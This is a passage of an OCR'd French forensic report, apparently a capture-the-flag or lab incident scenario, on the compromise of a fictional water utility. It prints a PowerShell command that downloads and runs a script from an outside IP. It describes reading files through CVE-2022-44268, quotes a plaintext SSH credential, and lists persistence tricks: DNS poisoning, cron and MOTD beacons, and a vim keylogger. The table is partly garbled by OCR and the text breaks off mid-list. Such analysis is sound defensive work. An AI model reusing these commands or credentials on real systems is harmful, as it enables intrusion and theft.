@@ -1,0 +1,47 @@
+Source locale : forensic/kissofdeath/ocr/p-002.txt
+Copie documentaire expurgée ; les affirmations restent celles de la source.
+
+3. Dossier 1 - AquaTerv / Centrale hydraulique (Shutter Island)
+3.1 Contexte
+AquaTerv est l'opérateur de la centrale hydraulique de Tervalis. L'investigation a porté sur le poste de travail
+Windows de l'ingénieure Zenith (DESKTOP-DONSMDE), sur le serveur web AquaWatch, ainsi que sur le serveur
+DNS interne (centrale.local). Des données hautement sensibles, plans du réseau de distribution d'eau au format
+EPANET, codes d'extinction des stations, ont été exfiltrées et mises en vente sur un marché clandestin du Dark
+Web.
+3.2 Chaine d'attaque
+Phase1 : Compromission du poste Zenith (ClickFix / clipboardpoisoning)
+L'attaquant a d'abord empoisonné le serveur DNS interne afin de rediriger le domaine updates.centrale.local vers
+l'infrastructure C2 externe (217.182.170.157). L'ingénieure Zenith a ensuite visité la page piégée (http://
+updates.centrale.local/windows) qui se présentait comme un faux portail de mises a jour de la centrale électrique.
+Le bouton « Copier » associé au bloc Windows Update déposait silencieusement dans le presse-papiers, en plus des
+commandes légitimes apparentes, la commande suivante :
+IEX(New-Object Net.WebClient).DownloadString(‘http://217.182.170.157/update-
+helper.ps1')
+L'ingénieure, croyant coller un simple script de mise a jour dans PowerShell (ouvert via Win+R -> powershell a
+20h36), a déclenché l'exécution fileless (en mémoire uniquement, sans écriture sur disque) du script malveillant
+update-helper.ps1.
+L'attaquant a ensuite effacé ses traces entre 20h19 et 20h38 : journaux PowerShell vidés via wevtutil, historique de
+console tronqué, lancement cle regedit.exe et eventvwr.msc pour verification visuelle.
+Phase 2 : Exploitation du serveur AquaWatch (CVE-2022-44268)
+Le 15 juillet 2026, l'attaquant (203.0.113.42) a conduit une reconnaissance du serveur AquaWatch a partir de 09h41
+UTC, puis exploité la vulnérabilité CVE-2022-44268 (lecture arbitraire de fichiers via la bibliotheque Pillow <
+9.4.0) en soumettant des images PNG spécialement concues via le formulaire de signalement.
+Deux fichiers ont été exfiltrés par ce biais :
+- /etc/passwd : <SECRET_EXPURGE>
+- /opt/aquawatch/.env: fichier de configuration contenant les identifiants SSH : water_technician:H20_t3ch!2026$
+L'attaquant a ensuite utilisé ces identifiants pour se connecter au serveur DNS via SSH a 10:07:14 UTC, confirmé
+par les entrées wtmp.
+Phase 3 : Persistence sur le serveur DNS (7 mécanismes)
+Connecté en tant que water_technician, l'attaquant a planté sept mécanismes de persistance sur le serveur DNS
+centrale.local :
+|# | Mécanisme | Localisation =| _ Description =
+DNS Poisoning | /etc/dnsmasq.d/ Redirection de updates.centrale.local vers
+centrale.conf 217.182.170.157
+
+/etc/cron.d/sysstat-collect | Beacon C2 toutes les 15 min, déguisé en collecte sysstat
+
+3 MOTD beacon /etc/update-motd.d/99- Curl obfusqué vers 203.0.113.99:8443 a chaque
+
+systemhealth connexion SSH
+Keylogger Vim /homel hnician/ vim/vibi Copie silencieuse de tout fichier sauvegardé dans vim
+water_tec ‘lines vIM/VIDIN | vers /dev/shm/.editor_swap
